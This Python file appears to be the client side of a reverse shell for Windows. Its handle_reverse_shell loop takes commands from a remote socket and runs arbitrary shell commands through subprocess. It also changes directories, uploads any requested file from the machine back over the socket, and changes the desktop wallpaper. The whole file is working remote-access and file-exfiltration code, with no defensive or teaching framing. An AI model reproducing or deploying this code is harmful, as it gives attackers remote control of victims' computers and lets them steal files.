import os
import threading
import ctypes
import struct
import subprocess
import socket

def change_wallpaper(image_path):
    """Change desktop wallpaper in a separate thread."""
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        print(f"Wallpaper changed to {image_path}")
    except Exception as e:
        print(f"Failed to change wallpaper: {e}")

def handle_reverse_shell(client_socket):
    while True:
        try:
            cmd_rece = client_socket.recv(1024).decode()
        except socket.timeout:
            print("Timeout waiting for command, returning to prompt.")
            continue

        if cmd_rece == "exit":
            break  # Exit the reverse shell loop
        elif cmd_rece[:2] == "cd":
            try:
                os.chdir(cmd_rece[3:])
                client_socket.send(os.getcwd().encode())
            except FileNotFoundError:
                client_socket.send(b"Directory not found")
            except Exception as e:
                client_socket.send(f"Error: {str(e)}".encode())
        elif cmd_rece == "chbackg":
            # Change the wallpaper
            wallpaper_thread = threading.Thread(target=change_wallpaper, args=("C:\\Users\\micke\\Desktop\\kgroung.jpg",))
            wallpaper_thread.start()
            wallpaper_thread.join()  # Wait for the thread to finish
        elif cmd_rece[:4] == "down":
            file_path = cmd_rece[5:]
            if os.path.isfile(file_path):
                try:
                    file_size = os.path.getsize(file_path)
                    client_socket.send(struct.pack('128sl', os.path.basename(file_path).encode().ljust(128, b'\0'), file_size))

                    with open(file_path, 'rb') as file:
                        while True:
                            chunk = file.read(1024)
                            if not chunk:
                                break
                            client_socket.send(chunk)

                    client_socket.send(b"Ended")  # Use 'Ended' marker to finish file transfer
                except Exception as e:
                    client_socket.send(f"Error: {str(e)}".encode())
            else:
                client_socket.send(b"FILE_NOT_FOUND")
                # print(f"File {file_path} not found.")
        else:
            try:
                out_put = subprocess.getoutput(cmd_rece)
                if not out_put:
                    out_put = "error"
                client_socket.send(out_put.encode())
            except Exception as e:
                client_socket.send(f"Error: {str(e)}".encode())
